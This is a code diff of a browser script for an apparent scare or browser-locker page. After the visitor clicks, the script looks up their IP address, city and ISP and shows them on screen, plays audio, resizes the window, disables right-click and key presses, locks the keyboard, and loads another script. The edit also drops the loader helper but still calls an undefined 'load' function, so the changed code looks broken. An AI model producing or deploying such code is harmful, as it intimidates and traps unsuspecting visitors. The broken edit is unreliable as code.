@@ -1,17 +1,5 @@
 (async () => {
-  const loader = (callback) => (url) => {
-    const script = document.createElement("script");
-    script.src = url;
-    script.async = true;
-
-    script.onload = callback;
-
-    script.onerror = () => {
-      console.error(`Failed to load ${url}`);
-    };
-
-    document.head.appendChild(script);
-  };
+  globalThis.console.log(`script`, 1);
 
   const show=    async x1=>{
     document.head.innerHTML = `
@@ -35,23 +23,20 @@
     id (`ip_add`).textContent = `Address IP: ${ipadd} ${b.toLocaleString (`EN-US`, currtime)}`;
     id (`cityopm`).textContent = `City: ${city}, ${country}`;
     id (`isp`).textContent = `ISP: ${isp}`;
-    id (`mycanvas`).style.display = "block";
-
-    document.querySelector('body > header').remove();
-    document.querySelector('body > main').remove();
+    id (`mycanvas`).style.display = `block`;
     id (`pridez`).play ();
 
     window.onload = ()=>{
       window.moveTo (0, 0);
       window.resizeTo (window.screen.availWidth, window.screen.availHeight);
     };
-    document.addEventListener("DOMContentLoaded", () => document.body.addEventListener("contextmenu", z1 => z1.preventDefault()));
+    document.addEventListener(`DOMContentLoaded`, () => document.body.addEventListener(`contextmenu`, z1 => z1.preventDefault()));
     document.onkeydown = ()=>{
       return false;
     };
     await window.navigator.keyboard.lock ();
 
-    loader(() => true)("./_/x-x.js");
+    load(`./_/x-x.js`);
 
     return true;
   };
@@ -64,7 +49,7 @@
 
   document.documentElement.addEventListener(`click`, async () => {
     document.getElementById(`remove`).remove();
-    document.body.style.overflow = "";
+    document.body.style.overflow = ``;
 
     const resp = await window.fetch(`https://ipwho.is/?lang=en`);
     const json = await resp.json();
@@ -77,5 +62,5 @@
     }
   });
 
-  document.body.style.overflow = "hidden";
+  document.body.style.overflow = `hidden`;
 })();
